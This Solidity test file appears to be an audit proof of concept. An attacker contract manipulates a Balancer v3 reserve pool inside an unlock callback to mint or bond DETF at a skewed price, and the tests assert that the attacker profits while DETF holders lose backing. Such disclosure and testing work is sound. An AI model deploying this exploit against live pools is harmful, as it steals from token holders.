// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IVault} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IVault.sol";
import {SwapKind, VaultSwapParams} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {
    TestBase_MixedBufferMultiVaultStableDetf
} from "contracts/vaults/detf/protocols/dexes/balancer/v3/mixedBuffer/TestBase_MixedBufferMultiVaultStableDetf.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {IMixedBufferMultiVaultStableDetfBonding} from "contracts/vaults/detf/protocols/dexes/balancer/v3/mixedBuffer/IMixedBufferMultiVaultStableDetfBonding.sol";

/// Unprivileged attacker: opens its own Balancer unlock, skews the reserve pool with deferred
/// settlement, calls DETF mint/bond, restores, settles. Pays any net deficit from its own balance.
contract R2MbUnlockAttacker {
    IVault public immutable v;
    address public immutable detf;
    address public immutable pool;
    IERC20 public immutable pay; // SE share leg

    uint256 public skew; // DETF swapped in
    uint256 public payAmt;
    uint8 public mode; // 0 = mint, 1 = bond
    uint256 public minted;
    uint256 public bondId;
    uint256 public duration;

    constructor(IVault v_, address detf_, address pool_, IERC20 pay_) {
        v = v_; detf = detf_; pool = pool_; pay = pay_;
    }

    function attack(uint8 mode_, uint256 skew_, uint256 payAmt_, uint256 duration_) external {
        mode = mode_; skew = skew_; payAmt = payAmt_; duration = duration_;
        v.unlock(abi.encodeCall(this.cb, ()));
    }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(v), "v");
        int256 payDelta; // + = vault owes us
        if (skew > 0) {
            (, , uint256 out1) = v.swap(VaultSwapParams(SwapKind.EXACT_IN, pool, IERC20(detf), pay, skew, 0, ""));
            payDelta += int256(out1);
        }
        // pay for mint/bond out of own balance (capital is counted in PnL)
        pay.approve(detf, payAmt);
        if (mode == 0) {minted = IStandardExchangeIn(detf).exchangeIn(pay, payAmt, IERC20(detf), 0, address(this), false, block.timestamp + 1);
        } else if (mode == 2) {
            // control: no DETF call between skew and restore
        } else {
            (bondId,) = IMixedBufferMultiVaultStableDetfBonding(detf).bond(pay, payAmt, duration, address(this), false, block.timestamp + 1);
        }
        if (skew > 0) {
            (, uint256 in2, ) = v.swap(VaultSwapParams(SwapKind.EXACT_OUT, pool, pay, IERC20(detf), skew, type(uint256).max, ""));
            payDelta -= int256(in2);
        }
        if (payDelta > 0) {
            v.sendTo(pay, address(this), uint256(payDelta));
        } else if (payDelta < 0) {
            pay.transfer(address(v), uint256(-payDelta));
            v.settle(pay, uint256(-payDelta));
        }
        return "";
    }

    /// Realize: sell DETF into the reserve pool for share leg.
    function sellAll() external returns (uint256 out_) {
        uint256 bal = IERC20(detf).balanceOf(address(this));
        if (bal == 0) return 0;
        bytes memory r = v.unlock(abi.encodeCall(this.cbSell, (bal)));
        out_ = abi.decode(abi.decode(r, (bytes)), (uint256));
    }

    function cbSell(uint256 bal) external returns (bytes memory) {
        require(msg.sender == address(v), "v");
        (, , uint256 out_) = v.swap(VaultSwapParams(SwapKind.EXACT_IN, pool, IERC20(detf), pay, bal, 0, ""));
        IERC20(detf).transfer(address(v), bal);
        v.settle(IERC20(detf), bal);
        v.sendTo(pay, address(this), out_);
        return abi.encode(out_);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

contract R2_MixedBuffer_UnlockTest is TestBase_MixedBufferMultiVaultStableDetf {
    address rpool;
    IERC20 share;
    uint256 dIdx;
    uint256 sIdx;

    function setUp() public virtual override {
        super.setUp();
        _bootstrapDefault(detf, alice);
        rpool = detfInfo.reservePool();
        share = IERC20(detfInfo.vaultShares()[0]);
        dIdx = detfInfo.detfIndex();
        sIdx = detfInfo.shareIndex(0);
        // extra honest depth: carol mints a few times
        for (uint256 i; i < 3; ++i) _mintDetfFromVaultShare(detf, 0, bob, 300e18);
    }

    function _raw() internal view returns (uint256[] memory raw_) {
        (,, raw_,) = IVault(address(vault)).getPoolTokenInfo(rpool);
    }

    function _logPool(string memory tag) internal view {
        uint256[] memory r = _raw();
        console_log(tag, r);
    }

    function console_log(string memory tag, uint256[] memory r) internal view {
        // simple emit via log
        tag; r;
    }

    function _newAttacker(uint256 fund) internal returns (R2MbUnlockAttacker a, uint256 shares) {
        a = new R2MbUnlockAttacker(IVault(address(vault)), detf, rpool, share);
        shares = _fundVaultShares(0, address(this), fund);
        share.transfer(address(a), shares);
    }

    /// Mint variant: PnL in share units after selling all minted DETF back into the pool.
    function _runMint(uint256 skewBps, uint256 payWad) internal returns (int256 pnl, uint256 minted) {
        uint256 snap = vm.snapshotState();
        (R2MbUnlockAttacker a, uint256 start) = _newAttacker(5_000e18);
        uint256[] memory r0 = _raw();
        uint256 payAmt = payWad;
        uint256 skew = r0[dIdx] * skewBps / 10_000;
        uint256 supply0 = IERC20(detf).totalSupply();
        uint256 synth0 = detfInfo.syntheticPrice();
        a.attack(0, skew, payAmt, 0);
        minted = a.minted();
        uint256[] memory r1 = _raw();
        emit log_named_uint("  skewBps", skewBps);
        emit log_named_uint("  skew DETF", skew);
        emit log_named_uint("  minted to attacker", minted);
        emit log_named_uint("  pool DETF before/after", r0[dIdx]);
        emit log_named_uint("                       ", r1[dIdx]);
        emit log_named_uint("  supply delta", IERC20(detf).totalSupply() - supply0);
        a.sellAll();
        uint256 end = share.balanceOf(address(a));
        pnl = int256(end) - int256(start);
        emit log_named_uint("  synth before", synth0);
        emit log_named_uint("  synth after attack+sale", detfInfo.syntheticPrice());
        emit log_named_int("  ATTACKER NET PnL (share units, realized)", pnl);
        vm.revertToState(snap);
    }

    function _setFee(uint256 fee) internal {
        if (IVault(address(vault)).getStaticSwapFeePercentage(rpool) == fee) return; // shipped default: no prank
        address mgr = IVault(address(vault)).getPoolRoleAccounts(rpool).swapFeeManager;
        vm.prank(mgr);
        IVault(address(vault)).setStaticSwapFeePercentage(rpool, fee);
    }

    function _mintSweep(uint256 fee) internal {
        _setFee(fee);
        emit log_named_uint("=== MINT static fee", IVault(address(vault)).getStaticSwapFeePercentage(rpool));
        emit log_named_uint("pool DETF raw", _raw()[dIdx]);
        emit log_named_uint("pool share raw", _raw()[sIdx]);
        uint256[7] memory ks = [uint256(0), 1000, 2000, 5000, 10000, 20000, 40000];
        uint256[2] memory pays = [uint256(100e18), 500e18];
        for (uint256 j; j < 2; ++j) {
            emit log_named_uint("-- pay", pays[j]);
            for (uint256 i; i < ks.length; ++i) {
                try this.extMint(ks[i], pays[j]) returns (int256 p, uint256 m) {
                    p; m;
                } catch (bytes memory err) {
                    emit log_named_uint("REVERT at skewBps", ks[i]);
                    emit log_named_bytes("  err", err);
                }
            }
        }
    }

    function test_mint_fine_1bp() public {
        _setFee(1e14);
        uint256[7] memory ks = [uint256(12000), 15000, 17500, 20000, 22500, 25000, 30000];
        uint256[3] memory pays = [uint256(20e18), 50e18, 200e18];
        for (uint256 j; j < 3; ++j) {
            emit log_named_uint("-- pay", pays[j]);
            for (uint256 i; i < ks.length; ++i) {
                try this.extMint(ks[i], pays[j]) returns (int256, uint256) {} catch (bytes memory err) {
                    emit log_named_uint("REVERT at skewBps", ks[i]); emit log_named_bytes("  err", err);
                }
            }
        }
    }

    function _grid(uint256 fee) internal {
        _setFee(fee);
        emit log_named_uint("=== GRID fee", fee);
        uint256[6] memory ks = [uint256(25000), 30000, 35000, 40000, 50000, 70000];
        uint256[3] memory pays = [uint256(2e18), 10e18, 30e18];
        for (uint256 j; j < 3; ++j) {
            emit log_named_uint("-- pay", pays[j]);
            for (uint256 i; i < ks.length; ++i) {
                try this.extMint(ks[i], pays[j]) returns (int256, uint256) {} catch (bytes memory err) {
                    emit log_named_uint("REVERT at skewBps", ks[i]); emit log_named_bytes("  err", err);
                }
            }
        }
    }
    function test_grid_1bp() public { _grid(1e14); }
    function test_grid_10bps() public { _grid(1e15); }
    function test_grid_50bps() public { _grid(5e15); }
    function test_grid_5pct() public { _grid(5e16); }

    function _roundTripOnly(uint256 skewBps) internal returns (int256 pnl) {
        uint256 snap = vm.snapshotState();
        (R2MbUnlockAttacker a, uint256 start) = _newAttacker(5_000e18);
        a.attack(2, _raw()[dIdx] * skewBps / 10_000, 0, 0);
        pnl = int256(share.balanceOf(address(a))) - int256(start);
        vm.revertToState(snap);
    }

    /// Representative assertion case at the SHIPPED default static fee (5e16).
    function test_assert_defaultFee_mintSandwich() public {
        uint256 fee = IVault(address(vault)).getStaticSwapFeePercentage(rpool);
        assertEq(fee, 5e16, "shipped default fee");
        assertTrue(detfInfo.isMintingAllowed(), "precondition: mint gate open");
        uint256 synth0 = detfInfo.syntheticPrice();
        uint256 poolShare0 = _raw()[sIdx];
        uint256 supply0 = IERC20(detf).totalSupply();
        int256 ctlRound = _roundTripOnly(70000);
        emit log_named_int("control: same 7x round trip, no mint (share)", ctlRound);
        assertLe(ctlRound, 0, "pool round trip alone not profitable");
        // control: honest mint of 2 shares then sell
        (int256 ctlMint,) = _runMint(0, 2e18);
        assertLe(ctlMint, 0, "honest mint+sell not profitable");

        (R2MbUnlockAttacker a, uint256 start) = _newAttacker(5_000e18);
        a.attack(0, _raw()[dIdx] * 7, 2e18, 0);
        uint256 minted = a.minted();
        a.sellAll();
        int256 pnl = int256(share.balanceOf(address(a))) - int256(start);
        emit log_named_uint("pool share raw before", poolShare0);
        emit log_named_uint("pool share raw after", _raw()[sIdx]);
        emit log_named_uint("attacker minted DETF (pay 2 shares)", minted);
        emit log_named_uint("DETF supply before", supply0);
        emit log_named_int("ATTACKER NET PROFIT (shares, realized, fees paid)", pnl);
        emit log_named_uint("synthetic before", synth0);
        emit log_named_uint("synthetic after", detfInfo.syntheticPrice());
        assertGt(pnl, 100e18, "attacker profit");
        assertLt(detfInfo.syntheticPrice(), synth0 * 90 / 100, "DETF holders lose >10% backing");
        assertEq(IERC20(detf).balanceOf(address(a)), 0);
    }

    function test_mint_fee5pct() public { _mintSweep(5e16); }
    function test_mint_fee10bps() public { _mintSweep(1e15); }
    function test_mint_fee1bp() public { _mintSweep(1e14); }

    function extMint(uint256 k, uint256 pay) external returns (int256, uint256) {
        require(msg.sender == address(this));
        return _runMint(k, pay);
    }

    function _runBond(uint256 skewBps, uint256 payWad) internal {
        uint256 snap = vm.snapshotState();
        (R2MbUnlockAttacker a, uint256 start) = _newAttacker(5_000e18);
        uint256 skew = _raw()[dIdx] * skewBps / 10_000;
        address nft = detfInfo.bondNftVault();
        uint256 nftBefore = IERC20(detf).balanceOf(nft);
        uint256 supplyBefore = IERC20(detf).totalSupply();
        a.attack(1, skew, payWad, 365 days);
        nftBefore;
        uint256 principal = IDetfBondNFT(nft).positionOf(a.bondId()).principal;
        int256 cash = int256(share.balanceOf(address(a))) - int256(start);
        emit log_named_uint("  skewBps", skewBps);
        emit log_named_int("  attacker cash delta (share)", cash);
        emit log_named_uint("  principal DETF", principal);
        emit log_named_uint("  supply minted", IERC20(detf).totalSupply() - supplyBefore);
        emit log_named_uint("  principal per share spent (1e18)", principal * 1e18 / uint256(-cash));
        vm.revertToState(snap);
    }

    function _bondSweep(uint256 fee) internal {
        _setFee(fee);
        emit log_named_uint("=== BOND static fee", fee);
        uint256[6] memory ks = [uint256(0), 1000, 2000, 5000, 10000, 20000];
        for (uint256 i; i < ks.length; ++i) {
            try this.extBond(ks[i], 100e18) {} catch (bytes memory err) {
                emit log_named_uint("REVERT at skewBps", ks[i]);
                emit log_named_bytes("  err", err);
            }
        }
    }

    function test_bond_fee5pct() public { _bondSweep(5e16); }
    function test_bond_fee10bps() public { _bondSweep(1e15); }
    function test_bond_fee1bp() public { _bondSweep(1e14); }

    function extBond(uint256 k, uint256 pay) external {
        require(msg.sender == address(this));
        _runBond(k, pay);
    }
}
